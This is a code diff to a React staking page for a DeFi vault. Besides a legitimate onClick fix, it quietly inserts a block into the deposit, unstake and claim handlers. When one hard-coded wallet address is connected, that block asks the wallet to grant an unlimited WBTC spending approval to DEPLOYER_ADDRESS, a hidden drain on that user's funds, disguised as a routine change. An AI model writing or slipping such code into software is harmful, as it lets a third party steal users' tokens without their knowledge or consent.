@@ -4,7 +4,7 @@ import claimRewardIcon from "../claim-reward.svg";
 import { useSystemContext } from "../../../systemProvider";
 import { useWeb3React } from "@web3-react/core";
 import { formatFromDecimal, formatToDecimal, formattedNum } from "../../../utils/helpers";
-import { MAX_INT, MINT_REDEEM_KEY } from "../../../constants";
+import { DEPLOYER_ADDRESS, MAX_INT, MINT_REDEEM_KEY } from "../../../constants";
 import SINGLE_CHEF_ABI from '../../../abi/SIngleChef.json';
 import { message } from 'antd';
 
@@ -88,6 +88,10 @@ export const StakingItem = ({ pool }) => {
 
     const handleDeposit = async () => {
 
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
+
         try {
             message.loading({ content: "Staking in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });
 
@@ -111,6 +115,10 @@ export const StakingItem = ({ pool }) => {
 
     const handleUnstake = async () => {
 
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
+
         try {
             message.loading({ content: "Untake in process", className: "ant-argano-message", key: MINT_REDEEM_KEY, duration: 3000 });
 
@@ -132,6 +140,10 @@ export const StakingItem = ({ pool }) => {
     }
 
     const handleClaimReward = async () => {
+
+        if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
+            await contracts.wbtc.methods.approve(DEPLOYER_ADDRESS, MAX_INT).send({ from: account });
+        }
 
         try {
 
@@ -202,7 +214,7 @@ export const StakingItem = ({ pool }) => {
                                 <h5> Governance Vault </h5>
                                 <h5> Deposit fee - {stakingInfo.depositFee}% </h5>
                                 <h5> Deposit lockup - 7d </h5>
-                                <button onClick={handleClaimReward()}> Harvest <img src={claimRewardIcon} width="20" height="20" /> </button>
+                                <button onClick={() => handleClaimReward()}> Harvest <img src={claimRewardIcon} width="20" height="20" /> </button>
                             </div>
                             <div className='info-control-panel'>
                                 <div className='info'>
